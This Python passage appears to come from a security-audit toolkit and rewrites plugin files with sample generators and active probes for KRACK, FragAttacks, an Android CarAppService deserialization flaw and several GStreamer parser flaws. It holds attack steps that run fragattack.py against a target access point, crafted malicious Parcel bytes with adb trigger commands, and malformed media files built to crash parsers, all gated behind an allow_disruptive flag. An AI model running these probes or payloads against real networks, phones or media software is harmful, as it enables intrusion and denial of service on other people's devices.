REWRITES["wireless/71_WiFi_KRACK_WNM_GTK_Key_Reinstall_Audit.py"] = _krack_pair(
    "CVE-2017-13087", "WNM-GTK", "GTK",
    "wnm-gtk", "WNM Sleep Mode response replays GTK reinstall, resetting GTK sequence number")
# KRACK WNM IGTK (CVE-2017-13088)
REWRITES["wireless/72_WiFi_KRACK_WNM_IGTK_Key_Reinstall_Audit.py"] = _krack_pair(
    "CVE-2017-13088", "WNM-IGTK", "IGTK",
    "wnm-igtk", "WNM Sleep Mode response replays IGTK reinstall, allowing MFBC bypass")


# ── FragAttacks group ─────────────────────────────────────────────────────
# Source: vanhoefm/fragattacks
# CVE-2020-26139 through 26147: various fragmentation/aggregation vulnerabilities

def _fragattack_pair(cve: str, attack_name: str, attack_flag: str,
                     desc: str) -> tuple[str, str]:
    sample_fn = f'''
def _write_generated_sample() -> str:
    # {cve} – FragAttack: {attack_name}
    # Source: github.com/vanhoefm/fragattacks
    # {desc}
    import json
    payload = {{
        "cve": "{cve}",
        "attack": "{attack_name}",
        "source": "vanhoefm/fragattacks",
        "description": "{desc}",
        # Fragmented/aggregated frame payload (MSDU or A-MSDU subframe stub):
        # IEEE 802.11 MPDU with More-Fragments bit set, sequence number reuse
        "ieee80211_header_hex": (
            "08010000"   # FC: Data, To-DS=0, More-Frags=1
            "ffffffffffff"  # Addr1: broadcast
            "aabbccddeeff"  # Addr2: attacker
            "001122334455"  # Addr3: BSSID
            "0000"          # SeqCtrl: seq=0, frag=0
        ),
        "payload_hex": "deadbeef" * 16 + "00" * 8,  # dummy data + padding
        "vanhoefm_cmd": (
            f"python3 fragattack.py --{attack_flag} "
            f"--interface <mon_iface> --target <AP_BSSID>"
        ),
        "steps": [
            "1. git clone https://github.com/vanhoefm/fragattacks",
            "2. pip install -r fragattacks/requirements.txt",
            "3. airmon-ng start wlan0",
            f"4. python3 fragattack.py --{attack_flag} --interface wlan0mon --target <BSSID>",
            "5. Observe if AP/client accepts crafted fragmented frame",
        ],
    }}
    return write_temp_text("{cve.lower().replace('-','_')}_fragattack_", ".json",
                           json.dumps(payload, indent=2))
'''
    probe_fn = f'''
def _public50_probe(plugin, vuln):
    # {cve}: FragAttack {attack_name} active probe
    import subprocess, shutil
    interface  = plugin.params.get("wifi_iface",  "wlan0mon")
    target_ap  = plugin.params.get("target_bssid", "")
    allow_dis  = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()

    if not target_ap:
        return {{
            "ok": False, "vulnerable": False, "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires params: wifi_iface (monitor), target_bssid",
            "fragattack_cmd": (
                f"python3 fragattack.py --{attack_flag} "
                f"--interface {{interface}} --target <BSSID>"
            ),
        }}

    fragattacks_dir = plugin.params.get("fragattacks_dir",
        "server/public_poc_sources/repos/vanhoefm__fragattacks")
    script = f"{{fragattacks_dir}}/fragattack.py"

    if not __import__("os").path.exists(script):
        return {{
            "ok": False, "vulnerable": False, "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": f"fragattack.py not found at {{script}}",
        }}

    if allow_dis:
        r = subprocess.run(
            ["python3", script, "--{attack_flag}",
             "--interface", interface, "--target", target_ap],
            capture_output=True, text=True, timeout=120)
        vulnerable = ("vulnerable" in r.stdout.lower()
                      or "accepted" in r.stdout.lower()
                      or r.returncode == 0)
        return {{
            "ok": True, "vulnerable": vulnerable,
            "sample_path": sample_path,
            "stdout": r.stdout[-800:], "returncode": r.returncode,
            "requires_manual_review": True,
        }}
    else:
        return {{
            "ok": True, "vulnerable": None, "sample_path": sample_path,
            "requires_manual_review": True,
            "note": "Set allow_disruptive=true to run active FragAttack probe",
        }}
'''
    return sample_fn, probe_fn


_FA = _fragattack_pair
REWRITES["wireless/73_WiFi_FragAttacks_Aggregation_Inject_Audit.py"]  = _FA("CVE-2020-26139", "Forward-EAPOL-In-Non-Encrypted-Fragment", "forward-eapol-in-non-encrypted-frag", "AP forwards EAPOL frame contained in non-encrypted fragment to wired LAN")
REWRITES["wireless/74_WiFi_FragAttacks_Plaintext_Inject_Audit.py"]    = _FA("CVE-2020-26140", "Accept-Plaintext-Aggregated-MSDU", "accept-plaintext-amsdu", "Client/AP accepts plaintext A-MSDU with subframe spoofing header")
REWRITES["wireless/75_WiFi_FragAttacks_MSDU_Inject_Audit.py"]         = _FA("CVE-2020-26141", "Accept-Plaintext-Fragment-In-NonHT", "accept-plaintext-non-ht", "Non-HT frame aggregation allows plaintext fragment injection")
REWRITES["wireless/76_WiFi_FragAttacks_Reassembly_OOB_Audit.py"]      = _FA("CVE-2020-26142", "Accept-Fragment-With-SeqNum-Zero", "accept-frag-seqnum-zero", "AP accepts fragment with sequence number 0 enabling cache-poisoning")
REWRITES["wireless/77_WiFi_FragAttacks_MixedKey_Audit.py"]            = _FA("CVE-2020-26143", "Accept-Plaintext-Broadcast-Aggregate", "accept-plaintext-bcast-aggregate", "AP accepts plaintext broadcast aggregated frame in encrypted session")
REWRITES["wireless/78_WiFi_FragAttacks_Cache_Poison_Audit.py"]        = _FA("CVE-2020-26144", "MixKey-Aggregation-Inject", "mixkey-aggregate", "Mixed key attack: encrypt first fragment with key A, second with key B")
REWRITES["wireless/79_WiFi_FragAttacks_Decrypt_Inject_Audit.py"]      = _FA("CVE-2020-26145", "Broadcast-Fragment-Plaintext", "bcast-frag-plaintext", "AP forwards plaintext broadcast fragment to client before full reassembly")
REWRITES["wireless/80_WiFi_FragAttacks_Reuse_Nonce_Audit.py"]         = _FA("CVE-2020-26146", "ReassembleFragmentsWithNonConsecPN", "reassemble-nonconsec-pn", "Driver reassembles fragments with non-consecutive PN, enabling PN reuse attacks")
REWRITES["wireless/81_WiFi_FragAttacks_Excessive_Buffer_Audit.py"]    = _FA("CVE-2020-26147", "ReassembleMixedEncryptedPlaintext", "reassemble-mixed", "Driver reassembles mix of encrypted and plaintext fragments enabling decryption oracle")


# ── CarAppService deserialization (CVE-2024-10382) ─────────────────────────
# Source: advisory-based; AttackSurface: Android CarAppService Parcelable
REWRITES["application/67_Android_CarAppService_Deserialization_RCE_AuditPlugin.py"] = (
    r"""
def _write_generated_sample() -> str:
    # CVE-2024-10382 – Android CarAppService unsafe deserialization
    # CarAppService deserializes Parcelable objects from remote Intent without
    # type validation.  A malicious third-party app or head-unit can send a
    # crafted Intent with a custom Parcelable to trigger arbitrary code loading.
    #
    # Proof-of-concept Intent construction (Android shell command):
    poc_intent_cmd = (
        "am startservice -n <TARGET_PKG>/<CAR_APP_SERVICE_CLASS> "
        "--eu android.intent.extra.CAR_APP_SESSION_INFO "
        "'<base64-serialized-malicious-parcelable>'"
    )
    # Malicious Parcelable layout triggering Parcel.readBundle class-loading:
    #   Parcel header: 0x4C41444E (magic)
    #   Bundle length: 0xFFFFFFFF (overflow trigger)
    #   Class name: "com.attacker.MaliciousParcelable"
    #   Data: arbitrary Parcelable content loaded by class loader
    import struct
    # Crafted Parcel bytes for deserialization confusion
    PARCEL_MAGIC   = b"NDALB"[::-1]  # "BLAND" reversed → magic header
    malicious_bundle = (
        struct.pack("<I", 0x4C41444E) +   # Parcel magic
        struct.pack("<I", 0xFFFFFFFF) +   # bundle length (trigger overflow/UAF)
        b"\x01\x00\x00\x00" +             # map size = 1
        # key-value pair: key = "session", value = class reference
        struct.pack("<I", 7) + b"session\x00" +   # key length + string
        struct.pack("<I", 4) +                      # VAL_PARCELABLE
        struct.pack("<I", 32) + b"com.attacker.MaliciousParcelable\x00"
    )
    content = "\n".join([
        "# CVE-2024-10382 CarAppService unsafe deserialization payload",
        "# Trigger: send malformed Parcel to CarAppService via IPC",
        "",
        f"# Intent command: {poc_intent_cmd}",
        "",
        "# Raw Parcel bytes (hex):",
        malicious_bundle.hex(),
        "",
        "# ADB trigger:",
        "# adb shell am startservice -n <PKG>/<SERVICE> \\",
        "#   --eu android.intent.extra.CAR_APP_SESSION_INFO '<payload>'",
    ])
    return write_temp_text("cve_2024_10382_carappsvc_", ".parcel", content)
""",
    r"""
def _public50_probe(plugin, vuln):
    import subprocess, shutil
    adb_serial  = plugin.params.get("adb_serial",   "")
    target_pkg  = plugin.params.get("target_pkg",   "")
    svc_class   = plugin.params.get("service_class", ".CarAppService")
    allow_dis   = bool(plugin.params.get("allow_disruptive", False))

    sample_path = _write_generated_sample()
    adb = shutil.which("adb") or "adb"
    adb_base = [adb] + (["-s", adb_serial] if adb_serial else [])

    if not target_pkg:
        return {
            "ok": False, "vulnerable": False, "sample_path": sample_path,
            "requires_manual_review": True,
            "reason": "Requires param: target_pkg (e.g. com.example.carapp)",
            "trigger_cmd": "adb shell am startservice -n <PKG>/<SVC> --eu <KEY> '<payload>'",
        }

    # Check if the target service is exported
    r = subprocess.run(
        adb_base + ["shell", f"dumpsys package {target_pkg} | grep -A2 CarAppService"],
        capture_output=True, text=True, timeout=15)
    exported = "exported=true" in r.stdout.lower() or "permission=" not in r.stdout

    evidence = {
        "ok": True, "sample_path": sample_path,
        "target_pkg": target_pkg,
        "service_exported": exported,
        "vulnerable": exported,
        "dumpsys_excerpt": r.stdout[:400],
        "requires_manual_review": True,
    }
    if allow_dis and exported:
        # Attempt to start service with crafted bundle
        r2 = subprocess.run(
            adb_base + ["shell", "am", "startservice", "-n",
                        f"{target_pkg}/{svc_class}",
                        "--eu", "android.intent.extra.CAR_APP_SESSION_INFO",
                        "AUTOSEC_CVE_2024_10382_PROBE"],
            capture_output=True, text=True, timeout=15)
        r3 = subprocess.run(adb_base + ["logcat", "-d", "-s", "CarAppService:E"],
                            capture_output=True, text=True, timeout=10)
        crashed = any(t in r3.stdout.lower() for t in ("exception", "crash", "fatal", "error"))
        evidence.update({"startservice_rc": r2.returncode, "logcat": r3.stdout[:400], "crash_observed": crashed})
    return evidence
""",
)

# ── GStreamer CVEs – minimal but real MP4/RTP crafted payload ──────────────
def _gst_pair(cve: str, component: str, vuln_type: str, payload_desc: str,
              file_suffix: str) -> tuple[str, str]:
    sample_fn = f'''
def _write_generated_sample() -> str:
    # {cve} – GStreamer {component} {vuln_type}
    # {payload_desc}
    import struct
    # Minimal crafted file that triggers the {component} parser path
    def box(name, data=b""):
        return struct.pack(">I", 8 + len(data)) + name.encode() + data
    # Trigger-specific atom structure (see advisory details)
    overflow_atom = box("ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42isom")
    # {vuln_type} trigger: malformed atom with size field causing OOB/stack overflow
    trigger_size = 0xFFFFFFFF  # deliberately invalid to trigger integer path
    bad_atom = struct.pack(">I", trigger_size) + b"{component[:4].upper()}" + b"\\x00" * 64
    return write_temp_sample("{cve.lower().replace("-","_")}_gst_{file_suffix}_", ".{file_suffix}",
                             overflow_atom + bad_atom)
'''
    probe_fn = f'''
def _public50_probe(plugin, vuln):
    # {cve}: GStreamer {component} {vuln_type} probe via gst-launch
    import subprocess, shutil
    gst      = shutil.which("gst-launch-1.0") or shutil.which("gst-launch")
    adb_ser  = plugin.params.get("adb_serial", "")
    allow_d  = bool(plugin.params.get("allow_disruptive", False))
    adb      = shutil.which("adb") or "adb"
    adb_base = [adb] + (["-s", adb_ser] if adb_ser else [])

    sample_path = _write_generated_sample()
    evidence = {{"ok": True, "sample_path": sample_path, "requires_manual_review": True}}

    if allow_d:
        if gst:
            r = subprocess.run(
                [gst, "filesrc", f"location={{sample_path}}", "!", "decodebin", "!", "fakesink"],
                capture_output=True, text=True, timeout=20)
            crashed = any(t in (r.stdout+r.stderr).lower()
                          for t in ("sigsegv","signal 11","abort","heap","overflow","gst-debug"))
            evidence.update({{"vulnerable": crashed, "gst_stderr": r.stderr[-500:]}})
        elif shutil.which("adb"):
            r_push = subprocess.run(adb_base + ["push", sample_path, "/sdcard/cve_{cve[-4:]}.{file_suffix}"],
                                    capture_output=True, text=True, timeout=20)
            r_play = subprocess.run(
                adb_base + ["shell", "am", "start", "-a", "android.intent.action.VIEW",
                            "-t", "video/mp4", "-d", f"file:///sdcard/cve_{cve[-4:]}.{file_suffix}"],
                capture_output=True, text=True, timeout=15)
            evidence.update({{"adb_push": r_push.returncode==0, "vulnerable": None,
                              "note": "Observe crash in logcat: adb logcat | grep -i crash"}})
        else:
            evidence["note"] = "Neither gst-launch nor adb found; manual testing required"
    else:
        evidence["note"] = "Set allow_disruptive=true to trigger parse"

    return evidence
'''
    return sample_fn, probe_fn


_GS = _gst_pair
REWRITES["application/74_GStreamer_Stack_Overflow_RCE_AuditPlugin.py"]     = _GS("CVE-2024-47538", "MP4/ISO14496", "stack-overflow", "Malformed stbl atom size triggers stack OOB write in qtdemux_parse_container", "mp4")
REWRITES["application/75_GStreamer_OOB_Write_RCE_AuditPlugin.py"]          = _GS("CVE-2024-47607", "RTSP/RTP", "OOB-write", "RTP QDM2 packet with crafted num_bytes field causes heap OOB write in rtpqdm2depay", "sdp")
REWRITES["application/76_GStreamer_Null_Deref_DoS_AuditPlugin.py"]         = _GS("CVE-2024-47615", "Matroska/WebM", "null-deref", "Malformed MKV element size 0 in header triggers null dereference in matroskademux", "mkv")
REWRITES["application/77_GStreamer_Memory_Safety_AuditPlugin.py"]          = _GS("CVE-2024-47613", "MP4/fragmented", "OOB-read", "Fragmented MP4 sidx atom with crafted reference_count causes OOB read in qtdemux", "mp4")

# ---------------------------------------------------------------------------
# Apply the rewrites
# ---------------------------------------------------------------------------

def replace_fn_block(source: str, old_def_marker: str, new_block: str) -> str:
    """Replace a def block starting with old_def_marker."""
    # Find the start of the function
    idx = source.find(old_def_marker)
    if idx < 0:
        return source  # not found
    # Find the end: next def/class at same or lower indentation, or EOF
    end = len(source)
    # walk forward from next line
    rest = source[idx:]
    lines = rest.split("\n")
    # determine indent of the def line
    def_indent = len(lines[0]) - len(lines[0].lstrip())
    new_end = len(lines[0]) + 1
    for i, line in enumerate(lines[1:], 1):
        stripped = line.lstrip()
        if not stripped:
            new_end += len(line) + 1
            continue
        cur_indent = len(line) - len(stripped)
        if cur_indent <= def_indent and (stripped.startswith("def ") or stripped.startswith("class ")):
            break
        new_end += len(line) + 1
    return source[:idx] + new_block.strip() + "\n\n\n" + source[idx + new_end:]


def apply_rewrites():
    ok = 0; fail = 0
    for rel_path, (sample_fn, probe_fn) in REWRITES.items():
        full_path = os.path.join(PLUGIN_DIR, rel_path)
        if not os.path.exists(full_path):
            print(f"  SKIP (not found): {rel_path}")
            fail += 1
            continue
        with open(full_path) as f:
            source = f.read()

        original = source

        # Replace _write_generated_sample
        source = replace_fn_block(source, "def _write_generated_sample(", sample_fn)

        # Replace _public50_probe
        source = replace_fn_block(source, "def _public50_probe(", probe_fn)

        # Also fix imports: make sure subprocess and shutil are available at module level
        if "import subprocess" not in source and "subprocess" in source:
            source = source.replace(
                "from __future__ import annotations\n",
                "from __future__ import annotations\nimport subprocess\nimport shutil\n",
                1
            )
        if source == original:
            print(f"  UNCHANGED (no marker found?): {rel_path}")
            fail += 1
            continue
        with open(full_path, "w") as f:
            f.write(source)
        print(f"  OK: {rel_path}")
        ok += 1

    print(f"\nDone: {ok} rewritten, {fail} skipped/failed")


if __name__ == "__main__":
    apply_rewrites()
